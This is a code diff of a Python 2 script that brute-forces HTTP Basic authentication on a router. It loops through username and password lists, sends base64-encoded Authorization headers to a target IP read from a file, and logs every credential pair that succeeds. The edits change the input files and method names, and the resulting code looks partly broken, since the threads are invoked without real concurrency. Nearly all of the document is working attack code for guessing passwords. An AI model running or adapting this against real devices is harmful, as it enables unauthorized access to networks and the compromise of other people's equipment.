@@ -20,34 +20,37 @@ class Rout_thread(threading.Thread):
 
         return
 
-    def start(self):
+    def rutorstart(self):
 
-        self.user=queue.get()
-
+        #self.user=queue.get()
+        self.user = self.queue.get()
         for self.passwd in self.passwordlist:
 
             request = urllib2.Request("http://"+target)
+            #request = urllib2.Request(requestheader)
 
             psw_base64 = "Basic " + base64.b64encode(self.user + ":" + self.passwd)
             #print psw_base64
-            request.add_header('Authorization', psw_base64)
 
+            request.add_header('Authorization', psw_base64)
 
             try:
                 response = urllib2.urlopen(request)
-                print response.geturl()
+                #print response.read()
 
                 print "[+]Correct! Username: %s, password: %s" % (self.user,self.passwd)
 
                 fp3 = open('log.txt','a')
 
-                fp3.write(self.user+'||'+self.passwd+'\r\n')
+                fp3.write("Success!  " + self.user + " | " + self.passwd+'\r\n')
 
                 fp3.close()
 
             except urllib2.HTTPError:
 
                 print "[-]password:%s Error!" % (self.passwd)
+
+global requestheader
 
 if __name__ == '__main__':
 
@@ -57,18 +60,22 @@ if __name__ == '__main__':
 
     passwordlist = []
 
-    line = 2500
+    #line = 2500
 
     threads = []
 
     global target
 
     #target = raw_input("input ip:")
-    target = "10.149.58.113"
+    fip = open("ip.txt")
 
-    fp =open("user.txt")
+    target = fip.readline().split('\n')[0]
 
-    fp2=open("passwd.txt")
+    print target
+    fp = open("user.txt")
+
+    #fp2=open("passwd.txt")
+    fp2 = open("temp.txt")
 
     for user in fp.readlines():
 
@@ -89,7 +96,7 @@ if __name__ == '__main__':
 
         a = Rout_thread(queue,passwordlist)
 
-        a.start()
+        a.rutorstart()
 
         threads.append(a)
 
